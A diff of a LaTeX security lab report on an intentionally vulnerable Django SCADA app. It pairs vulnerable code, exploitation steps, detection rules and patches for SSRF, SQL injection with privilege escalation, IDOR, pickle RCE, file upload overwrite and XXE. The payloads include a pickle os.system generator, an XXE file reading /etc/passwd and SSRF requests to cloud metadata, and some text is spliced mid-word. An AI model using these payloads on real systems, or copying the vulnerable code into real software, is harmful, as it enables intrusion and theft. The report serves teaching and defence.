+        target_url = request.POST.get('url')
+        if target_url:
+            try:
+                # VULNERABILITY: No URL validation - accepts ANY URL!
+                response = requests.get(target_url, timeout=5)
+                status_content = f"Response: {response.text[:200]}"
+            except Exception as e:
+                status_content = f"Error: {str(e)}"
+    
+    return render(request, 'vulnerable/ssrf.html', {'content': status_content})
+\end{lstlisting}
 
-\subsubsection{Scenario 2a: Dashboard - Locked Device Revelation}
-By default, admin dashboard shows only non-locked devices. The NUCLEAR-CORE-CONTROLLER is permanently locked out (\texttt{is\_locked\_out=True}) for safety. An attacker with admin access can use SQL injection to reveal these hidden critical devices.
+\subsubsection{Exploitation}
 
-\subsubsection{Vulnerable Code}
+\begin{lstlisting}[language=bash]
+# Navigate to: http://localhost:8000/vulnerable/ssrf/
+# Enter these URLs in the form:
+
+# Attack 1: Localhost service scan
+URL: http://127.0.0.1:8000/vulnerable/dashboard/
+Result: Returns internal admin dashboard HTML
+
+# Attack 2: Internal network scan
+URL: http://192.168.1.1/admin
+Result: Accesses router admin panel from server
+
+# Attack 3: Cloud metadata (AWS EC2)
+URL: http://169.254.169.254/latest/meta-data/
+Result: Retrieves AWS IAM credentials
+\end{lstlisting}
+
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 261-278)}
+
+\begin{lstlisting}[language=Python]
+# VULNERABILITY DETECTION #10: SSRF
+if not attack_detected and '/ssrf/' in endpoint:
+    if request.method == 'POST':
+        target_url = request.POST.get('url', '').lower()
+        
+        dangerous_patterns = [
+            'localhost', '127.0.0.1', '0.0.0.0',
+            '169.254.169.254',  # AWS/Azure metadata
+            '192.168.', '10.', '172.16.',  # Private networks
+        ]
+        
+        if any(pattern in target_url for pattern in dangerous_patterns):
+            attack_detected = 'SSRF - Server-Side Request Forgery'
+            severity = 'HIGH'
+\end{lstlisting}
+
+\subsubsection{Patch Implementation (patched/views.py, Lines 146-168)}
+
+\begin{lstlisting}[language=Python]
+def patched_ssrf(request):
+    context = {}
+    if request.method == 'POST':
+        url = request.POST.get('url', '')
+        
+        # FIX: Allowlist approach - only trusted domains
+        allowed_domains = ['scada-update-server.com', 'example.com']
+        
+        is_allowed = any(
+            url.startswith(f"http://{d}") or url.startswith(f"https://{d}") 
+            for d in allowed_domains
+        )
+        
+        if is_allowed:
+            try:
+                response = requests.get(url, timeout=5)
+                context['result'] = response.text[:200]
+            except Exception as e:
+                context['result'] = f"Error: {str(e)}"
+        else:
+            context['result'] = "Blocked: Domain not in allowlist."
+            
+    return render(request, 'patched/ssrf.html', context)
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{Allowlist Approach:} Only whitelisted domains accepted
+    \item \textbf{No Internal IPs:} Localhost and private ranges blocked
+\end{enumerate}
+
+\newpage
+
+\subsection{Vulnerability 8: Privilege Escalation + Data Exfiltration (CWE-269 + CWE-89)}
+
+\subsubsection{Description}
+This vulnerability combines privilege escalation with CVE-2025-64459 SQL Injection to exfiltrate hidden critical infrastructure data. Users can manipulate URL parameters (\texttt{?is\_admin=true}) to escalate privileges, then use \texttt{connector=OR} SQL injection to reveal locked-out NUCLEAR devices.
+
+\subsubsection{Vulnerable Code - Dashboard (vulnerable/views.py, Lines 108-184)}
 
 \begin{lstlisting}[language=Python]
 def vulnerable_dashboard(request):
+    user_data = request.session.get('user', {})
+    
+    # VULNERABILITY 1: Privilege escalation via URL parameter
+    if 'is_admin' in request.GET:
+        admin_value = str(request.GET.get('is_admin')).lower()
+        if admin_value in ['true', '1']:
+            user_data['is_admin'] = True  # ESCALATION!
+            request.session['user'] = user_data
+    
+    is_admin = user_data.get('is_admin', False)
+    
+    if is_admin:
+        # VULNERABILITY 2: CVE-2025-64459 SQL injection
+        connector = request.GET.get('connector', 'AND')
+        filter_params = request.GET.copy()
+        
+        # Default: Admin sees only non-locked operational devices
+        query = Q(is_locked_out=False)
+        
+        # SQL INJECTION: connector=OR reveals locked devices
+        for key, value in filter_params.items():
+            if connector == 'OR':
+                query |= Q(**{key: value})  # Reveals NUCLEAR!
+            else:
+                query &= Q(**{key: value})
+        
+        devices = Device.objects.filter(query)
+\end{lstlisting}
+
+\subsubsection{Exploitation - Dashboard}
+
+\begin{lstlisting}[language=bash]
+# Navigate to browser and enter these URLs:
+
+# Step 1: Privilege escalation (any user becomes admin)
+http://localhost:8000/vulnerable/dashboard/?is_admin=true
+# Session now has is_admin=True
+
+# Step 2: CVE-2025-64459 SQL Injection - reveal locked devices
+http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=True
+# SQL: WHERE is_locked_out=False OR is_locked_out=True
+# Result: Shows ALL devices (20-21) including NUCLEAR (locked-out, red)
+
+# Alternative: Target NUCLEAR specifically
+http://localhost:8000/vulnerable/dashboard/?connector=OR&name__icontains=NUCLEAR
+# SQL: WHERE is_locked_out=False OR name LIKE '%NUCLEAR%'
+# Result: NUCLEAR-CORE-CONTROLLER visible
+\end{lstlisting}
+
+\subsubsection{Vulnerable Code - Maintenance (vulnerable/views.py, Lines 345-410)}
+
+\begin{lstlisting}[language=Python]
+@csrf_exempt
+def maintenance_interface(request):
     user_data = request.session.get('user', {})
     is_admin = user_data.get('is_admin', False)
     
@@ -479,898 +1060,988 @@ def vulnerable_dashboard(request):
         connector = request.GET.get('connector', 'AND')
         filter_params = request.GET.copy()
         
-        # Default: Admin sees operational devices, but NUCLEAR is hidden
-        # Simulates "need-to-know" policy where critical devices are restricted
-        query = Q(is_locked_out=False) & ~Q(name__icontains='NUCLEAR')
+        # Default: Maintenance devices but NUCLEAR HIDDEN by policy
+        query = Q(status='Maintenance') & ~Q(name__icontains='NUCLEAR')
         
-        # VULNERABILITY: Admin can inject OR filter to reveal NUCLEAR
+        # SQL INJECTION: connector=OR bypasses NUCLEAR filter!
         for key, value in filter_params.items():
             if connector == 'OR':
-                query |= Q(**{key: value})  # DANGEROUS - bypasses NUCLEAR filter
-            else:
-                query &= Q(**{key: value})
+                query |= Q(**{key: value})  # Reveals NUCLEAR!
         
-        devices = Device.objects.filter(query)
-    else:
-        # Regular users: hardcoded filter (no injection possible)
-        devices = Device.objects.filter(status='Operational', is_locked_out=False)
+        maintenance_devices = Device.objects.filter(query)
 \end{lstlisting}
 
-\subsubsection{Exploitation}
+\subsubsection{Exploitation - Maintenance Interface}
 
 \begin{lstlisting}[language=bash]
-# Step 1: Login as admin (via auth bypass)
-"http://localhost:8000/vulnerable/login/?username=hacker&connector=OR&is_superuser=True"
+# Navigate to browser and enter these URLs:
 
-# Step 2: Normal admin view (NUCLEAR devices hidden)
-"http://localhost:8000/vulnerable/dashboard/"
-# Shows: 17-18 operational devices (no NUCLEAR)
+# Step 1: Login as admin (via CVE-2025-64459)
+http://localhost:8000/vulnerable/login/?username=hacker&connector=OR&is_superuser=True
 
-# Step 3: SQL Injection - reveal critical NUCLEAR devices
-"http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=False"
-# Shows: 18-21 devices including NUCLEAR-CORE-CONTROLLER (locked-out, red background)
+# Step 2: Normal maintenance view (NUCLEAR HIDDEN)
+http://localhost:8000/vulnerable/maintenance/
+# Shows maintenance devices but NO NUCLEAR (policy restriction)
+
+# Step 3: CVE-2025-64459 SQL Injection - reveal NUCLEAR-CORE
+http://localhost:8000/vulnerable/maintenance/?connector=OR&name__icontains=NUCLEAR
+# SQL: WHERE status='Maintenance' AND NOT LIKE '%NUCLEAR%' OR LIKE '%NUCLEAR%'
+# Result: NUCLEAR-CORE-CONTROLLER appears! (Defense-in-depth bypassed)
 \end{lstlisting}
 
-\textbf{Attack Logic:}\\
-Original query: \texttt{WHERE is\_locked\_out=False AND name NOT LIKE '\%NUCLEAR\%'}\\
-Injected query: \texttt{WHERE (is\_locked\_out=False AND name NOT LIKE '\%NUCLEAR\%') OR name LIKE '\%NUCLEAR\%'}\\
-Result: Critical NUCLEAR devices revealed (bypasses security filter)
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 130-146)}
 
-\textbf{Impact:}
-\begin{itemize}[leftmargin=*]
-    \item Reveals hidden critical infrastructure (NUCLEAR reactor core controller)
-    \item Bypasses "need-to-know" access control policy
-    \item Only works for admin users (regular users have hardcoded filter)
-    \item Enables reconnaissance for targeted attacks on critical systems
-    \item Demonstrates vulnerability chaining: Auth Bypass $\rightarrow$ Admin Access $\rightarrow$ SQL Injection $\rightarrow$ Critical Asset Discovery
-\end{itemize}
-
-\textbf{Why Only Admin Can Exploit This SQL Injection:}
-The SQL injection vulnerability exists exclusively in the admin code path. This design reflects real-world scenarios where:
-\begin{itemize}[leftmargin=*]
-    \item \textbf{Code Path Separation:} Regular users bypass the vulnerable code entirely (hardcoded filter: \texttt{status='Operational'}), while admins enter the dynamic query construction block
-    \item \textbf{Dynamic vs Static Queries:} Admin panels implement complex filtering/search features using user-supplied parameters, creating injection points
-    \item \textbf{False Sense of Security:} Developers trust admin users and skip input validation ("admin is trusted anyway")
-    \item \textbf{Vulnerability Chaining:} Combined with Privilege Escalation (Vulnerability 2), any user can first become admin via \texttt{?is\_admin=true}, then exploit this SQL injection
-    \item \textbf{Defense-in-Depth Failure:} Even privileged roles require input validation - admin status should not bypass security controls
-    \item \textbf{Real-World Pattern:} Many breaches occur when attackers compromise admin accounts and exploit "power user" features lacking proper security
-\end{itemize}
-
-\subsubsection{Scenario 2b: Maintenance Interface - NUCLEAR-CORE Discovery}
-The maintenance interface contains a similar SQL injection vulnerability where admin users can manipulate the \texttt{connector} parameter to reveal NUCLEAR devices that should be hidden. By default, the maintenance view excludes NUCLEAR devices using the filter \texttt{\textasciitilde Q(name\_\_icontains='NUCLEAR')}, but the OR connector bypasses this restriction.
-
-\textbf{Exploitation:}
-\begin{lstlisting}[language=bash]
-# Normal maintenance view (NUCLEAR devices hidden)
-curl http://localhost:8000/vulnerable/maintenance/ -b cookies.txt
-# Shows: Only non-NUCLEAR devices in maintenance
-
-# SQL Injection - reveal NUCLEAR devices in maintenance
-curl "http://localhost:8000/vulnerable/maintenance/?connector=OR&name__icontains=NUCLEAR" -b cookies.txt
-# Shows: NUCLEAR-CORE devices revealed in maintenance interface
+\begin{lstlisting}[language=Python]
+# VULNERABILITY DETECTION #3 & #4: PRIVILEGE ESCALATION + SQL INJECTION
+if not attack_detected and '/dashboard/' in endpoint:
+    # Pattern 1: Privilege Escalation
+    if re.search(r"(?i)(is_admin=true|is_superuser=true)", full_path):
+        attack_detected = 'Privilege Escalation - Parameter Manipulation'
+        severity = 'CRITICAL'
+    
+    # Pattern 2: SQL Injection (CVE-2025-64459)
+    elif re.search(r"(?i)(connector=OR|name__icontains=NUCLEAR)", full_path):
+        attack_detected = 'SQL Injection - CVE-2025-64459 (Data Exfiltration)'
+        severity = 'CRITICAL'
 \end{lstlisting}
 
-\textbf{Impact:}
-\begin{itemize}[leftmargin=*]
-    \item Bypasses need-to-know security policy for critical infrastructure
-    \item Reveals maintenance status of sensitive NUCLEAR systems
-    \item Enables targeted attacks on critical operational technology
-    \item Combined vulnerability: Auth Bypass $\rightarrow$ Admin Access $\rightarrow$ SQL Injection $\rightarrow$ NUCLEAR Discovery
-\end{itemize}
-
-\subsubsection{Patch Implementation}
+\subsubsection{Patch Implementation - Dashboard (patched/views.py, Lines 43-71)}
 
 \begin{lstlisting}[language=Python]
 def patched_dashboard(request):
     user_data = request.session.get('user', {})
+    
+    # FIX 1: NO URL parameter processing for authorization
     is_admin = user_data.get('is_admin', False)
     
+    # FIX 2: NO dynamic query construction - hardcoded filters only
     if is_admin:
-        # Hardcoded query - no user input
-        devices = Device.objects.filter(is_locked_out=False)
+        devices = Device.objects.filter(
+            status__in=['Operational', 'Maintenance'], 
+            is_locked_out=False
+        )
     else:
-        devices = Device.objects.filter(status='Operational', is_locked_out=False)
-    
-    return render(request, 'patched/dashboard.html', {'devices': devices})
+        devices = Device.objects.filter(
+            status='Operational', 
+            is_locked_out=False
+        )
 \end{lstlisting}
 
-\textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Removed dynamic query construction from GET parameters
-    \item Hardcoded filters based on user role
-    \item Explicit allowlist of accessible resources
-\end{itemize}
-
-\subsection{Vulnerability 4: IDOR \& Unsafe Temporary Files (Vulnerabilities A \& D - CWE-639, CWE-377)}
-
-\subsubsection{Description}
-Two related vulnerabilities in the diagnostic report system:
-\begin{itemize}[leftmargin=*]
-    \item \textbf{Vulnerability A: IDOR (CWE-639)} - Insecure Direct Object Reference allowing users to access diagnostic reports by guessing report IDs without ownership verification
-    \item \textbf{Vulnerability D: Unsafe Temporary Files (CWE-377)} - Temporary PDF reports are created with predictable names and reused across users, enabling information disclosure
-\end{itemize}
-
-Missing authorization checks combined with predictable temporary file paths allow attackers to access arbitrary reports and potentially retrieve cached sensitive data.
-
-\subsubsection{Vulnerable Code}
+\subsubsection{Patch Implementation - Maintenance (patched/views.py, Lines 189-236)}
 
 \begin{lstlisting}[language=Python]
-def vulnerable_report(request):
-    report_id = request.GET.get('id', '1')
+@csrf_protect
+def patched_maintenance_interface(request):
+    user_data = request.session.get('user', {})
+    is_admin = user_data.get('is_admin', False)
     
-    # VULNERABILITY 1 (IDOR): No authorization check
-    report = DiagnosticReport.objects.get(id=report_id)
-    
-    # VULNERABILITY 2 (Unsafe Temp): Predictable filename
-    temp_file_path = f"/tmp/scada_report_{report_id}.pdf"
-    
-    # Generate PDF with report details
-    c = canvas.Canvas(temp_file_path, pagesize=letter)
-    c.drawString(100, 750, f"Report ID: {report.id}")
-    c.drawString(100, 730, report.details)
-    c.save()
-    
-    # File persists and can be accessed by other users
-    response = HttpResponse(content_type='application/pdf')
-    response['Content-Disposition'] = f'attachment; filename="report_{report_id}.pdf"'
-\end{lstlisting}
-
-\subsubsection{Exploitation}
-
-\begin{lstlisting}[language=bash]
-# IDOR Attack: Access admin secret report (ID 103)
-curl "http://localhost:8000/vulnerable/report/?id=103" -o admin_secret.pdf
-# Contains: "CONFIDENTIAL: Root Password is 'supersecret123'"
-
-# Enumerate all reports (IDOR)
-for i in {103..143}; do
-  curl "http://localhost:8000/vulnerable/report/?id=$i" -o "report_$i.pdf"
-done
-
-# Result: Access to 41 diagnostic reports including admin secrets
-
-# Unsafe Temp Files: Predictable paths allow direct access
-# Attacker knows temp file location: /tmp/scada_report_103.pdf
-# Previously generated reports persist and can be retrieved
-\end{lstlisting}
-
-\textbf{Impact of Unsafe Temporary Files:}
-\begin{itemize}[leftmargin=*]
-    \item Predictable file paths enable targeted access
-    \item Temporary files persist after request completion
-    \item Cached reports may contain stale but sensitive data
-    \item Multiple users share the same temp file namespace
-\end{itemize}
-
-\subsubsection{Patch Implementation}
-
-\begin{lstlisting}[language=Python]
-import uuid
-import os
-
-def patched_report(request):
-    report_id = request.GET.get('id', '1')
-    user = request.session.get('user', {})
-    
-    # FIX 1 (IDOR): Authorization check
-    report = DiagnosticReport.objects.get(id=report_id)
-    if not user.get('is_admin') and int(report_id) <= 10:
-        return HttpResponse("Access Denied: Unauthorized", status=403)
-    
-    # FIX 2 (Unsafe Temp): UUID-based unique filename
-    unique_id = uuid.uuid4()
-    temp_file_path = f"/tmp/scada_report_{unique_id}.pdf"
-    
-    # Generate PDF
-    c = canvas.Canvas(temp_file_path, pagesize=letter)
-    c.drawString(100, 750, f"Report ID: {report.id}")
-    c.save()
-    
-    response = FileResponse(open(temp_file_path, 'rb'))
-    
-    # FIX 3: Clean up temp file after sending
-    os.remove(temp_file_path)
-    return response
-\end{lstlisting}
-
-\textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Resource ownership verification (IDOR fix)
-    \item Role-based access control (RBAC)
-    \item UUID-based unpredictable filenames (Temp file fix)
-    \item Automatic cleanup of temporary files after use
-    \item Use Python's \texttt{tempfile} module for secure temp file handling
-\end{itemize}
-
-\subsection{Vulnerability 5: Insecure Deserialization (Pickle RCE) (Vulnerability B - CWE-502)}
-
-\subsubsection{Description}
-Insecure Deserialization vulnerability (CWE-502) - Deserialization bug where corrupted pickle payloads can crash the rendering engine or achieve Remote Code Execution (RCE).
-Application accepts and deserializes untrusted pickle data, allowing arbitrary code execution.
-
-\subsubsection{Vulnerable Code}
-
-\begin{lstlisting}[language=Python]
-def vulnerable_deserialize(request):
-    if request.method == 'POST' and request.FILES.get('file'):
-        file = request.FILES['file']
-        data = file.read()
-        
-        # VULNERABILITY: Deserializing untrusted data
-        obj = pickle.loads(data)
-        return JsonResponse({'status': 'success', 'data': str(obj)})
-\end{lstlisting}
-
-\subsubsection{Exploitation}
-
-Malicious payload generator (\texttt{create\_pickle\_payload.py}):
-
-\begin{lstlisting}[language=Python]
-import pickle
-import os
-
-class MaliciousPayload:
-    def __reduce__(self):
-        # Return (callable, args) - executes os.system
-        return (os.system, ('whoami',))
-
-with open('malicious_payload.pkl', 'wb') as f:
-    pickle.dump(MaliciousPayload(), f)
-\end{lstlisting}
-
-Attack execution:
-\begin{lstlisting}[language=bash]
-# Generate malicious pickle payload
-python3 create_pickle_payload.py
-# Output: Base64 encoded payload
-
-# Send payload to vulnerable endpoint
-curl -X POST http://localhost:8000/vulnerable/deserialize/ \
-     -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "diagnostic_data=gASVSwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDBlY2hvICJNQUxJQ0lPVVMgQ09ERSBFWEVDVVRFRCEiID4gL3RtcC9wd25lZC50eHSUhZRSlC4="
-
-# Verify code execution
-docker compose exec web cat /tmp/pwned.txt
-# Output: MALICIOUS CODE EXECUTED!
-\end{lstlisting}
-
-\subsubsection{Patch Implementation}
-
-\begin{lstlisting}[language=Python]
-def patched_deserialize(request):
-    if request.method == 'POST' and request.FILES.get('file'):
-        file = request.FILES['file']
-        data = file.read()
-        
-        # Use JSON instead of pickle
-        obj = json.loads(data.decode('utf-8'))
-        return JsonResponse({'status': 'success', 'data': obj})
-\end{lstlisting}
-
-\textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Replace pickle with safe serialization (JSON, Protocol Buffers)
-    \item Input validation and type checking
-    \item Sandboxing if deserialization is unavoidable
-\end{itemize}
-
-\subsection{Vulnerability 6: File Upload \& Overwrite (Vulnerabilities C \& E - CWE-434)}
-
-\subsubsection{Description}
-Two related file upload vulnerabilities:
-\begin{itemize}[leftmargin=*]
-    \item \textbf{Vulnerability C: File Overwrite (CWE-434)} - Uploaded diagnostic scripts overwrite existing files without warning
-    \item \textbf{Vulnerability E: Unrestricted Upload of Dangerous File Types (CWE-434)} - No file type validation allows uploading executables, scripts, and other dangerous files
-\end{itemize}
-No file type validation allows uploading of dangerous files and overwriting critical system files.
-
-\subsubsection{Vulnerable Code}
-
-\begin{lstlisting}[language=Python]
-def vulnerable_upload(request):
-    if request.method == 'POST' and request.FILES.get('file'):
-        uploaded_file = request.FILES['file']
-        
-        # VULNERABILITY: No filename sanitization or type checking
-        file_path = os.path.join('media', uploaded_file.name)
-        
-        with open(file_path, 'wb+') as destination:
-            for chunk in uploaded_file.chunks():
-                destination.write(chunk)
-        
-        return HttpResponse(f"File {uploaded_file.name} uploaded successfully")
-\end{lstlisting}
-
-\subsubsection{Exploitation}
-
-\begin{lstlisting}[language=bash]
-# Step 1: Upload original diagnostic script
-echo "ORIGINAL PRODUCTION SCRIPT" > diagnostic_script.txt
-curl -X POST http://localhost:8000/vulnerable/upload/ \
-     -F "file=@diagnostic_script.txt"
-
-# Verify upload
-cat media/diagnostic_script.txt
-# Output: ORIGINAL PRODUCTION SCRIPT
-
-# Step 2: Upload malicious file with same name (FILE OVERWRITE)
-echo "MALICIOUS CODE - BACKDOOR INSTALLED!" > diagnostic_script.txt
-curl -X POST http://localhost:8000/vulnerable/upload/ \
-     -F "file=@diagnostic_script.txt"
-
-# Step 3: Verify overwrite attack succeeded
-cat media/diagnostic_script.txt
-# Output: MALICIOUS CODE - BACKDOOR INSTALLED!
-\end{lstlisting}
-
-\textbf{Impact:}
-\begin{itemize}[leftmargin=*]
-    \item Production scripts replaced with malicious code
-    \item No versioning or backup mechanism
-    \item System executes attacker-controlled scripts
-    \item Potential for persistent backdoor installation
-\end{itemize}
-
-\subsubsection{Patch Implementation}
-
-\begin{lstlisting}[language=Python]
-def patched_upload(request):
-    if request.method == 'POST' and request.FILES.get('file'):
-        uploaded_file = request.FILES['file']
-        filename = uploaded_file.name.lower()
-        
-        # Whitelist allowed extensions
-        allowed_extensions = ['.pdf', '.xml', '.txt', '.csv']
-        if not any(filename.endswith(ext) for ext in allowed_extensions):
-            return JsonResponse({
-                'status': 'error',
-                'message': 'Invalid file type'
-            }, status=400)
-        
-        # Generate secure filename with UUID
-        import uuid
-        safe_filename = f"{uuid.uuid4()}_{filename}"
-        fs = FileSystemStorage()
-        fs.save(safe_filename, uploaded_file)
-\end{lstlisting}
-
-\textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Whitelist approach for allowed file types
-    \item UUID-based filen7: XXE - XML External Entity Injection (Vulnerability G)
-
-\subsubsection{Description}
-Classic XXE injection vulnerability (CWE-611) allowing attackers to steal data through XML external entity resolution.r uploaded files
-\end{itemize}
-
-\subsection{Vulnerability 7: XXE - XML External Entity Injection (Vulnerability G - CWE-611)}
-
-\subsubsection{Description}
-XML parser configured with \texttt{resolve\_entities=True} allows reading arbitrary files.
-
-\subsubsection{Vulnerable Code}
-
-\begin{lstlisting}[language=Python]
-def vulnerable_upload(request):
-    if filename.endswith('.xml'):
-        # VULNERABILITY: resolve_entities=True
-        parser = etree.XMLParser(resolve_entities=True)
-        xml_content = uploaded_file.read()
-        tree = etree.fromstring(xml_content, parser=parser)
-        return JsonResponse({'data': etree.tostring(tree).decode()})
-\end{lstlisting}
-
-\subsubsection{Exploitation}
-
-Malicious XML file (\texttt{xxe\_attack.xml}):
-
-\begin{lstlisting}[language=XML]
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<data>
-  <content>&xxe;</content>
-</data>
-\end{lstlisting}
-
-Attack:
-\begin{lstlisting}[language=bash]
-curl -X POST http://localhost:8000/vulnerable/upload/ \
-     -F "file=@xxe_attack.xml"
-\end{lstlisting}
-
-Server response contains \texttt{/etc/passwd} contents:
-\begin{lstlisting}[language=XML]
-<root>
-  <data>root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-</data>
-</root>
-\end{lstlisting}
-
-Attacker successfully reads system files, exposing user accounts and system configuration.
-
-\subsubsection{Patch Implementation}
-
-\begin{lstlisting}[language=Python]
-def patched_upload(request):
-    if filename.endswith('.xml'):
-        # Disable entity resolution
-        parser = etree.XMLParser(resolve_entities=False, no_network=True)
-        xml_content = uploaded_file.read()
-        tree = etree.fromstring(xml_content, parser=parser)
-\end{lstlisting}
-
-\textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Disable external entity resolution
-    \item Disable DTD processing
-    \item Use secure XML parsing libraries (defusedxml)
-    \item Input validation and sanitization
-\end{itemize}
-
-\subsection{Vulnerability 8: SSRF - Server-Side Request Forgery (Vulnerability F - CWE-918)}
-
-\subsubsection{Description}
-Server-Side Request Forgery vulnerability allowing remote access to internal systems. Application accepts arbitrary URLs and makes server-side requests without validation.
-
-\subsubsection{Vulnerable Code}
-
-\begin{lstlisting}[language=Python]
-import urllib.request
-
-def vulnerable_ssrf(request):
-    url = request.GET.get('url', '')
-    
-    # VULNERABILITY: No URL validation
-    response = urllib.request.urlopen(url)
-    content = response.read()
-    
-    return HttpResponse(content)
-\end{lstlisting}
-
-\subsubsection{Exploitation}
-
-\begin{lstlisting}[language=bash]
-# Access internal admin panel
-curl "http://localhost:8000/vulnerable/ssrf/?url=http://localhost:8000/admin/"
-
-# Scan internal network
-curl "http://localhost:8000/vulnerable/ssrf/?url=http://192.168.1.1/"
-
-# AWS metadata endpoint (if on EC2)
-curl "http://localhost:8000/vulnerable/ssrf/?url=http://169.254.169.254/latest/meta-data/"
-\end{lstlisting}
-
-\subsubsection{Patch Implementation}
-
-\begin{lstlisting}[language=Python]
-import requests
-from urllib.parse import urlparse
-
-def patched_ssrf(request):
-    url = request.GET.get('url', '')
-    
-    # Whitelist allowed domains
-    allowed_domains = ['example.com', 'scada-update-server.com']
-    
-    parsed = urlparse(url)
-    if parsed.netloc not in allowed_domains:
-        return JsonResponse({
-            'status': 'error',
-            'message': 'Domain not allowed'
-        }, status=403)
-    
-    response = requests.get(url, timeout=5)
-    return HttpResponse(response.content)
-\end{lstlisting}
-
-\textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Whitelist approach for allowed domains
-    \item URL parsing and validation
-    \item Block internal IP ranges (RFC 1918)
-    \item Implement timeouts and rate limiting
-\end{itemize}
-
-\subsection{Vulnerability 9: Security Misconfiguration - Unauthorized Access to Monitoring Logs (OWASP A05:2021)}
-
-\subsubsection{Description}
-Security oversight allowing unauthenticated/unauthorized users to access sensitive monitoring logs. The monitoring system's log viewer endpoint lacks proper authorization checks, enabling any user to view attack logs containing IP addresses, attack patterns, and system vulnerabilities. This information disclosure represents a configuration oversight that enables reconnaissance for future attacks.
-
-\subsubsection{Vulnerable Code}
-
-\begin{lstlisting}[language=Python]
-def log_viewer(request, filter_path=None):
-    """Display attack logs - NO AUTHENTICATION CHECK!"""
-    
-    # VULNERABILITY: No authorization check
-    # Any user can access sensitive security logs
-    logs = AttackLog.objects.all().order_by('-timestamp')
-    
-    return render(request, 'monitoring/logs.html', {
-        'logs': logs,
-        'critical_count': AttackLog.objects.filter(severity='CRITICAL').count(),
-        'blocked_ips': BlockedIP.objects.all()
-    })
-\end{lstlisting}
-
-\subsubsection{Exploitation}
-
-\begin{lstlisting}[language=bash]
-# Step 1: Login as regular user (no admin privileges)
-curl "http://localhost:8000/vulnerable/login/?username=user&password=user123"
-
-# Step 2: Access monitoring logs without admin check
-curl "http://localhost:8000/monitoring/"
-
-
-# Result: Full access to security logs without admin privileges!
-# Exposed sensitive information:
-# - All attacker IP addresses (reconnaissance data)
-# - Attack patterns and payloads (what works, what doesn't)
-# - Severity classifications (which attacks are most dangerous)
-# - Recommended defensive actions (learn system defenses)
-# - System vulnerabilities being actively exploited
-# - Blocked IP addresses (blacklist enumeration)
-\end{lstlisting}
-
-\textbf{Attack Scenario:}
-\begin{enumerate}[leftmargin=*]
-    \item Attacker gains regular user access (via auth bypass or compromised credentials)
-    \item Accesses \texttt{/monitoring/} endpoint without admin check
-    \item Studies attack logs to understand:
-    \begin{itemize}
-        \item Which exploitation attempts succeeded/failed
-        \item System's detection capabilities and blind spots
-        \item Other attackers' IP addresses (potential scapegoats)
-        \item Exact attack patterns that trigger alerts
-    \end{itemize}
-    \item Uses reconnaissance data to craft more sophisticated attacks
-    \item Evades detection by learning from logged attack patterns
-\end{enumerate}
-
-\textbf{Information Disclosed:}
-\begin{itemize}[leftmargin=*]
-    \item Attack type classifications (SQL Injection, XXE, SSRF patterns)
-    \item Successful/failed attack attempts
-    \item IP addresses of blocked attackers (blacklist enumeration)
-    \item System defensive capabilities and detection patterns
-    \item Admin usernames from resolved logs
-\end{itemize}
-
-\subsubsection{Patch Implementation}
-
-\begin{lstlisting}[language=Python]
-def log_viewer(request, filter_path=None):
-    """Display attack logs - ADMIN ONLY"""
-    
-    # Authentication check
-    user = request.session.get('user', {})
-    if not user.get('is_admin'):
+    # FIX 1: Server-side admin check with 403 response
+    if not is_admin:
         return HttpResponse(
-            "<h1>Access Denied</h1>"
-            "<p>Security monitoring logs require administrator privileges.</p>",
+            "<h1>Access Denied</h1>",
             status=403
         )
     
-    logs = AttackLog.objects.all().order_by('-timestamp')
-    return render(request, 'monitoring/logs.html', {'logs': logs})
+    # FIX 2: Hardcoded query - NO user input
+    # CRITICAL: Exclude NUCLEAR devices (defense-in-depth)
+    maintenance_devices = Device.objects.filter(
+        status='Maintenance'
+    ).exclude(
+        name__icontains='NUCLEAR'
+    ).order_by('-is_locked_out', 'name')
 \end{lstlisting}
 
 \textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Role-based access control (RBAC) enforcement
-    \item Session-based authentication validation
-    \item Admin privilege verification before displaying sensitive data
-    \item Proper HTTP 403 Forbidden responses for unauthorized access
-    \item Security logs classified as privileged information
-\end{itemize}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{No URL Parameters:} Authorization based on session only
+    \item \textbf{Hardcoded Queries:} No dynamic Q() object construction
+    \item \textbf{Defense-in-Depth:} NUCLEAR devices excluded via \texttt{.exclude()}
+    \item \textbf{CSRF Protection:} Maintenance actions require CSRF tokens
+\end{enumerate}
 
-\textbf{Additional Admin-Only Actions:}
-\begin{itemize}[leftmargin=*]
-    \item IP blocking/unblocking (\texttt{block\_ip\_action}, \texttt{unblock\_ip\_action})
-    \item Session revocation (\texttt{revoke\_session\_action})
-    \item Log resolution and annotation (\texttt{resolve\_log\_action})
-    \item CSV export of attack data (\texttt{export\_logs})
-\end{itemize}
+\newpage
 
-All admin action endpoints verify \texttt{user.is\_admin} and return HTTP 403 for unauthorized attempts.
+\subsection{Vulnerability 9: Unsafe Temporary Files (CWE-377)}
+
